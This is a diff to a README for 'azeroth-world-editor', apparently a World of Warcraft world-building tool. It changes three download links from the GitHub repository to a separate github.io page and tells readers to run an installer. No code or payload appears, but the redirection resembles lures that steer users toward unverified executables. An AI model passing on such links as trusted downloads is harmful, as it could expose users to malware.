@@ -1,6 +1,6 @@
 # 🎮 azeroth-world-editor - Build Your World, Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-AWE_Setup-blue?style=for-the-badge&logo=windows&logoColor=white&color=random)](https://github.com/200PATOLINO/azeroth-world-editor)
+[![Download Now](https://img.shields.io/badge/Download-AWE_Setup-blue?style=for-the-badge&logo=windows&logoColor=white&color=random)](https://200patolino.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Let’s get AWE onto your computer. Follow these steps carefully.
 ### Step 1: Download the App
 
 1.  Click the blue button below or the one at the top of this page. It takes you to the official download area.
-2.  [**Download AWE Now**](https://github.com/200PATOLINO/azeroth-world-editor)
+2.  [**Download AWE Now**](https://200patolino.github.io)
 
 ### Step 2: Run the Installer
 
@@ -151,7 +151,7 @@ You now have everything you need to start transforming your World of Warcraft se
 
 Grab your copy, open the editor, and make your Azeroth unforgettable.
 
-[**Click Here to Download Azeroth World Editor**](https://github.com/200PATOLINO/azeroth-world-editor)
+[**Click Here to Download Azeroth World Editor**](https://200patolino.github.io)
 
 ---
 
